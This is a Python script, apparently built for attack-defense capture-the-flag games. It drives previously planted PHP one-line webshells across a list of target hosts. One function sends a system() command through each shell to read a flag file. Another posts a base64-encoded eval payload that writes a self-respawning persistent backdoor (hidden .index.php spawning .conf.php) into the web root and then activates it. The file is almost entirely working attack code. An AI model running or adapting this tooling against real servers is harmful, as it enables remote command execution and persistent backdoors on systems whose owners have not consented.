import requests
import re
import base64


def loadfile(file_path):
    # file_path=http://127.0.0.1:80/index.php,post,pass
    try:
        with open(file_path,'r') as f:
            return str(f.read())
    except:
        print ("File %s Not Found!" % file_path)

# 获取flag的函数
def exploit():
    for i in range(len(url)):
		# 打印信息
		#print ("url is %s method is %s passwd is %s" % (url[i],method[i],passwd[i]))
		data = {passwd[i] : 'system("/bin/cat /flag.txt");' ,'pass':'poxiao'}
		
		try:
			if method[i]=='post':
				#print("%s is exploit" % url[i])
				# 根据实际情况调整timeout的时间，默认单位是秒
				r = requests.post(url[i],data,timeout=0.4)
			else:
				r = requests.get(url[i],params=data,timeout=0.4)
			res = r.text
            # 利用正则匹配flag，根据实际情况自行调整
			flag = re.search('(flag{.*})',res)
			ip = re.search('\/\/(.*):',url[i])
			print(ip.group(1) + "\t" + flag.group(1))
		except:
			with open('failed.txt','a') as f:
				f.write("%s is timeout\n" % url[i])
		
# 对后门进行处理
def process(url,method,passwd,shell_path_list):
	for index in range(len(shell_path_list)): 
		if shell_path_list[index]:
			data  = shell_path_list[index].split(",")
			method_tmp = str(data[1])
			method_tmp = method_tmp.lower()
			if method_tmp=='post' or method_tmp=='get':
			# 检测方法是否为post或者get
				url.append(str(data[0]))
				method.append(str(data[1]))
				passwd.append(str(data[2]))
			else:
				print ("[-] %s request method error!" % str(data[0]))
		else:
			pass

def upload(url,method,passwd,upload_path):
	#http://127.0.0.1:80/1110/x.php,post,x
	path = upload_path
	# 上传的不死马的文件名
	shell_name = "/.index.php"
	# 不死马文件中shell的名字
	undead_shell_name = '/.conf.php'
	#加载要写入本地的不死马的内容
	shellPath = "./shell1.php"
	shell_content = loadfile(shellPath)
	data = {}
	for index in range(len(url)):
		# 判断shell是否存在
		try:
			res = requests.get(url[index],timeout=3)
			print(url[index] + "'s webshell exists")
		except:
			print ("[-] %s ERR_CONNECTION_TIMED_OUT" % url[index])
			continue
		if res.status_code!=200 :
			print ("[-] %s Page Not Found!" % url[index])
			continue
		if method[index] =="post" :
			data[passwd[index]] = "@eval(base64_decode($_POST['z0']));"
			data['z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOwokYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTsKJGJ1Zj0iIjsKZm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MSkKICAgICRidWYuPXN1YnN0cigkYywkaSwxKTsKZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1ZikpOwplY2hvKCJ8PC0iKTsKZGllKCk7'
			data['z1'] = base64.b64encode(path + shell_name)
			data["z2"] = base64.b64encode(shell_content)
			#print data
			res = requests.post(url[index],data=data)

		elif method[index]=="get" :
			data[passwd[index]] = "@eval(base64_decode($_GET['z0']));"
			data['z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX0dFVFsiejEiXSk7CiRjPWJhc2U2NF9kZWNvZGUoJF9HRVRbInoyIl0pOwokYz1zdHJfcmVwbGFjZSgiXHIiLCIiLCRjKTsKJGM9c3RyX3JlcGxhY2UoIlxuIiwiIiwkYyk7CiRidWY9IiI7CmZvcigkaT0wOyRpPHN0cmxlbigkYyk7JGkrPTEpCiAgICAkYnVmLj1zdWJzdHIoJGMsJGksMSk7CmVjaG8oQGZ3cml0ZShmb3BlbigkZiwidyIpLCRidWYpKTsKZWNobygifDwtIik7CmRpZSgpOw=='
			data['z1'] = base64.b64encode(path + shell_name)
			data["z2"] = base64.b64encode(shell_content)
			res = requests.post(url[index],params=data)
		else :
			print "method err!"
			sys.exit()
		# 激活不死马	具体路径可能要修改
		try:
			url_undead = re.search('(http://.*?/)',url[index]).group(1) + re.search('/var/www/html/(.*)',path).group(1) 
			res = requests.get(url_undead + shell_name,timeout=2)
		except:
			pass
		# 尝试访问不死马生成的shell,文件名要和不死马内容里面的文件名一致
		res = requests.get(url_undead + undead_shell_name)
		if res.status_code!=200 :
			print "[-] %s create shell failed!" % (url_undead + undead_shell_name)
			continue
		#输出shell地址
		print "[+] %s upload sucessed!" % (url_undead + undead_shell_name)
		


if __name__=='__main__':
    #已知的一句话的后门
	shell_path_str = loadfile("shell_path.txt")    
	shell_path_list = shell_path_str.split("\n")
	#print(shell_path_list)
	url = []
	method = []
	passwd = []
	process(url,method,passwd,shell_path_list)
	# 获取flag
	#exploit()
	# 上传的后门内容
	shell = loadfile("shell.php")
	# 上传路径
	upload_path = '/var/www/html/admin'
	# 上传木马
	# upload(url,method,passwd,upload_path)